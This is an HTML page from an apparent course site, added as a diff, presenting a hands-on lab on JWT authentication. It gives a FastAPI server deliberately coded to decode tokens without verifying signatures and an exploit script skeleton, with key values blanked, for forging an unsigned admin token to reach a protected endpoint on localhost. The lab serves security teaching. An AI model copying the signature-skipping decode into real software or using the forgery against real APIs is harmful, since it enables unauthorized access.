@@ -1,0 +1,1166 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://example.com/01-API-Authentication/4-2-Lab-Practice/">
+      
+      
+        <link rel="prev" href="../4-1-MCQ-Practice/">
+      
+      
+        <link rel="next" href="../Merged/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
+    
+    
+      
+        <title>Practice - My Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.2afb09e1.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#environment-setup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Practice
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    My Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Welcome to MkDocs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    01 API Authentication
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            01 API Authentication
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../0-Overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-Background/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to API authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-1-JWTs/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to JSON Web Tokens
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2-2-Broken-Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Broken authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-1-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-2-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4-1-MCQ-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#environment-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Environment Setup
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Environment Setup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerable-program" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Vulnerable Program
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-exploit-program" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Exploit Program
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Commands
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1-obtain-a-valid-jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1: Obtain a valid JWT
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-forge-a-jwt-to-escalate-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2: Forge a JWT to Escalate Privileges
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Merged/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to API authentication
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    05 Third Party Libraries
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            05 Third Party Libraries
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/0-Overview/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/2-Content/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to third party libraries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/3-1-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/3-2-Real-Example/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Real Example 2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/4-1-MCQ-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/4-2-Lab-Practice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Practice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-Third-Party-Libraries/Merged/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introduction to third party libraries
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#environment-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Environment Setup
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Environment Setup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerable-program" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Vulnerable Program
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-exploit-program" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Exploit Program
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Commands
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-1-obtain-a-valid-jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 1: Obtain a valid JWT
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-2-forge-a-jwt-to-escalate-privileges" class="md-nav__link">
+    <span class="md-ellipsis">
+      Task 2: Forge a JWT to Escalate Privileges
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Practice</h1>
+
+<p>This exercise puts you in a scenario similar to the one in the modules, where attackers exploited JWT authentication. Here, you will focus on simulating the potential impact and explore different types of attacks. This practice highlights the risks and consequences of weak or improper authentication.</p>
+<h2 id="environment-setup">Environment Setup</h2>
+<p>For this exercise, we will use Python to create a script to interact with a vulnerable API. The script will be used to send forged JWTs to exploit weak or improper JWT authentication. Before we start, we will create a virtual environment to isolate the dependencies we need for this exercise.</p>
+<p><strong>Virtual Environment:</strong> A Python virtual environment is a self-contained directory that isolates different Python dependencies, allowing you to manage different versions of libraries for each project without conflicts.</p>
+<pre><code class="language-bash"># Create a virtual environment
+python -m venv .venv
+
+# Then activate the virtual environment
+
+# On Windows
+.venv\Scripts\activate
+
+# On Unix or MacOS
+source .venv/bin/activate
+</code></pre>
+<p><strong>Install Requirements:</strong> This exercise uses external libraries and frameworks for the script and API. The dependencies we will need are Requests, Python-JOSE, and FastAPI to create, send, and receive JWTs through the API.</p>
+<pre><code class="language-bash"># Install Requests
+python -m pip install requests
+
+# Install Python-JOSE
+python -m pip install python-jose
+
+# Install FastAPI
+python -m pip install &quot;fastapi[standard]&quot;
+</code></pre>
+<h3 id="the-vulnerable-program">The Vulnerable Program</h3>
+<p>The vulnerable program used in this exercise is called <code>server.py</code>. This program is a simple API with an endpoint to receive a JWT and a protected endpoint to use the JWT. This program is vulnerable to forged JWTs, and you will explore how to exploit this to access protected endpoints.</p>
+<pre><code class="language-python"># Save this as server.py
+from datetime import datetime, timedelta, timezone
+
+from fastapi import FastAPI, Header, HTTPException
+from jose import JWTError, jwt
+from pydantic import BaseModel
+
+app = FastAPI()
+
+# Secret keys for demonstration purposes
+SECRET_KEY = &quot;insecure_secret_key&quot;
+ALGORITHM = &quot;HS256&quot;
+
+# Fake user database with roles
+fake_user_db = {
+    &quot;user1&quot;: {&quot;password&quot;: &quot;password123&quot;, &quot;role&quot;: &quot;user&quot;},
+    &quot;admin&quot;: {&quot;password&quot;: &quot;admin123&quot;, &quot;role&quot;: &quot;admin&quot;},
+}
+
+
+# Input model for receiving credentials
+class LoginRequest(BaseModel):
+    username: str
+    password: str
+
+
+# Generates a JWT
+def create_access_token(data: dict):
+    to_encode = data.copy()
+    to_encode[&quot;exp&quot;] = datetime.now(timezone.utc) + timedelta(minutes=15)
+    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
+
+
+# Endpoint to receive a JWT if credentials are valid
+@app.post(&quot;/login&quot;)
+def login(request: LoginRequest):
+    username = request.username
+    password = request.password
+    user = fake_user_db.get(username)
+
+    if not user or user[&quot;password&quot;] != password:
+        raise HTTPException(status_code=401, detail=&quot;Invalid credentials&quot;)
+
+    access_token = create_access_token({&quot;sub&quot;: username, &quot;role&quot;: user[&quot;role&quot;]})
+    return {&quot;access_token&quot;: access_token, &quot;token_type&quot;: &quot;bearer&quot;}
+
+
+# Endpoint to access the admin data
+@app.get(&quot;/admin&quot;)
+def admin_data(authorization: str = Header(...)):
+    try:
+        # Extract the token from the &quot;Authorization: Bearer &lt;token&gt;&quot; header
+        token = authorization.split(&quot;Bearer &quot;)[-1]
+
+        # Decode the JWT
+        data = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM], options={&quot;verify_signature&quot;: False})
+
+        # Check the user's role
+        if data.get(&quot;role&quot;) != &quot;admin&quot;:
+            raise HTTPException(status_code=403, detail=&quot;Forbidden: You do not have admin privileges.&quot;)
+
+        return {&quot;message&quot;: &quot;Welcome admin!&quot;}
+    except JWTError:
+        # Handle cases where the token decode fails
+        raise HTTPException(status_code=401, detail=&quot;Invalid token&quot;)
+</code></pre>
+<h3 id="the-exploit-program">The Exploit Program</h3>
+<p>The exploit program used in this exercise is called <code>exploit.py</code>. This program is a script that can make requests to the vulnerable API. This will demonstrate how attackers can forge JWTs to access protected endpoints.</p>
+<pre><code class="language-python"># Save this as exploit.py
+
+import base64
+import json
+
+import requests
+
+# Base URL of the API server
+BASE_URL = &quot;http://127.0.0.1:8000&quot;
+
+
+# Task 1: Obtain a valid JWT
+def get_valid_token(username, password):
+    &quot;&quot;&quot;Logs in with credentials and retrieves the JWT.&quot;&quot;&quot;
+    # Prepare the request data
+    endpoint = &quot;...&quot;
+    credentials = {...}
+
+    response = requests.post(endpoint, json=credentials)
+
+    if response.status_code == 200:
+        # Retrieve the JWT token
+        token = response.json().get(&quot;access_token&quot;)
+        print(f&quot;Valid JWT Token: {token}&quot;)
+
+        # Decode the JWT token (splitting into header, payload, and signature)
+        header, payload, signature = token.split(&quot;.&quot;)
+        decoded_header = base64.urlsafe_b64decode(header + &quot;==&quot;).decode()  # Decode header
+        decoded_payload = base64.urlsafe_b64decode(payload + &quot;==&quot;).decode()  # Decode payload
+
+        # Display the decoded header and payload
+        print(&quot;\nDecoded Header:&quot;)
+        print(json.loads(decoded_header))
+        print(&quot;\nDecoded Payload:&quot;)
+        print(json.loads(decoded_payload))
+
+        return token
+    else:
+        print(f&quot;Failed to retrieve token: {response.status_code} - {response.json()}&quot;)
+
+
+# Task 2: Forge a JWT to Escalate Privileges
+def forge_token():
+    &quot;&quot;&quot;Creates a forged JWT.&quot;&quot;&quot;
+    # Prepare the JWT data
+    header = {
+        &quot;alg&quot;: &quot;...&quot;,
+        &quot;typ&quot;: &quot;...&quot;,
+    }
+    payload = {
+        &quot;sub&quot;: &quot;...&quot;,
+        &quot;role&quot;: &quot;...&quot;,
+    }
+
+    # Encode the header and payload as base64 URL-safe strings
+    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().strip(&quot;=&quot;)
+    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().strip(&quot;=&quot;)
+
+    # Construct the token without a signature
+    forged_token = &quot;...&quot;
+
+    print(f&quot;Forged JWT: {forged_token}&quot;)
+    return forged_token
+
+
+def use_token(endpoint, token):
+    &quot;&quot;&quot;Uses a JWT token to access an endpoint.&quot;&quot;&quot;
+    headers = {&quot;Authorization&quot;: f&quot;Bearer {token}&quot;}
+
+    response = requests.get(endpoint, headers=headers)
+
+    try:
+        print(f&quot;Response: {response.status_code} - {response.json()}&quot;)
+    except ValueError:
+        print(f&quot;Response: {response.status_code} - {response.text}&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    print(&quot;Task 1: Obtain a Valid JWT&quot;)
+    username = &quot;user1&quot;
+    password = &quot;password123&quot;
+    valid_token = get_valid_token(username, password)
+
+    # Uncomment to run Task 2
+
+    # print(&quot;\nTask 2: Forge a JWT to Escalate Privileges&quot;)
+    # admin_endpoint = f&quot;{BASE_URL}/admin&quot;
+    # forged_token = forge_token()
+    # use_token(admin_endpoint, forged_token)
+</code></pre>
+<h3 id="common-commands">Common Commands</h3>
+<p>In the following, we list some common commands for this exercise.</p>
+<pre><code class="language-bash"># Start the exploit script
+python /path/to/exploit.py
+
+# Start the server for the API
+fastapi dev /path/to/server.py
+
+# To stop the server press CTRL+C to quit
+</code></pre>
+<h2 id="task-1-obtain-a-valid-jwt">Task 1: Obtain a valid JWT</h2>
+<p>In this task, we will simulate how an attacker might attempt to learn about the authentication process by first obtaining a valid JWT. Your goal is to prepare the request data to log in and receive a JWT using valid credentials.</p>
+<pre><code class="language-python">def get_valid_token(username, password):
+    ...
+    # Prepare the request data
+    endpoint = &quot;...&quot;
+    credentials = {...}
+    ...
+</code></pre>
+<p>When you finished preparing the request, start the vulnerable program and run the exploit script. If it works, the script will show the content of the JWT.</p>
+<pre><code class="language-python">Valid JWT Token: ...
+
+Decoded Header:
+{...}
+
+Decoded Payload:
+{...}
+</code></pre>
+<h2 id="task-2-forge-a-jwt-to-escalate-privileges">Task 2: Forge a JWT to Escalate Privileges</h2>
+<p>In this task, we will simulate how an attacker might attempt to gain unauthorized access to a protected endpoint by forging a JWT. Your goal is to prepare the JWT data to make a forged token to bypass authentication.</p>
+<pre><code class="language-python">def forge_token(original_token):
+    ...
+    # Prepare the JWT data
+    header = {
+        &quot;alg&quot;: &quot;...&quot;,
+        &quot;typ&quot;: &quot;...&quot;,
+    }
+    payload = {
+        &quot;sub&quot;: &quot;...&quot;,
+        &quot;role&quot;: &quot;...&quot;,
+    }
+    ...
+    # Construct the token without a signature
+    forged_token = &quot;...&quot;
+    ...
+</code></pre>
+<p>When you finished forging a JWT, start the vulnerable program and run the exploit script. If it works, the server will respond with administrative access.</p>
+<pre><code class="language-python">Response: 200 - {'message': 'Welcome admin!'}
+</code></pre>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
